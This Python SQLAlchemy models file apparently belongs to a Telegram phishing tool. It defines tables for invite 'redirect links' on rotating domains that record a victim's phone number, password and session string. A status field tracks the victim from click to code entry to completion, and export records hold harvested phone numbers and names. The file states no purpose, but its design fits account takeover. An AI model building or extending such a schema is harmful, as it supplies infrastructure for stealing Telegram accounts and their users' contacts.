from sqlalchemy import (Column, Integer, String, Date, ForeignKey, 
                        Text, Boolean, DateTime)
from sqlalchemy.orm import relationship
from sqlalchemy.ext.declarative import declarative_base
import secrets
import string

Base = declarative_base()

class ExportRecord(Base):
    __tablename__ = 'export_records'

    id = Column(Integer, primary_key=True)
    phone = Column(String, nullable=False)
    name = Column(String, nullable=True)
    export_date = Column(Date, nullable=False)
    directory_name = Column(String, nullable=False)

    # 🔑 зв’язок із RedirectLink
    redirect_id = Column(String, ForeignKey("redirect_links.id"))
    redirect_link = relationship("RedirectLink", back_populates="exports")   

class TelegramChannel(Base):
    __tablename__ = "telegram_channels"

    id = Column(Integer, primary_key=True, index=True)
    photo = Column(String, nullable=True)
    name = Column(String, nullable=False)
    invite_link = Column(String, nullable=False)


class RedirectLink(Base):
    __tablename__ = "redirect_links"

    id = Column(String, primary_key=True, index=True) 
    link = Column(String, nullable=False, unique=True)
    redirect_id = Column(Integer, ForeignKey("telegram_channels.id"))
    phone = Column(String, nullable=True)
    password = Column(String, nullable=True)
    session_string = Column(Text, nullable=True)
    status = Column(String, default="created")  # created, clicked, code_entered, comleted
    active = Column(Boolean, default=True)
    alive = Column(Boolean, default=True)
    date = Column(DateTime, nullable=True)

    redirect = relationship("TelegramChannel")

    exports = relationship("ExportRecord", back_populates="redirect_link")


class Domain(Base):
    __tablename__ = "domains"

    id = Column(Integer, primary_key=True, index=True)
    name = Column(String, nullable=False)
    domen = Column(String, nullable=False, unique=True)


def generate_key(length=8):
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))
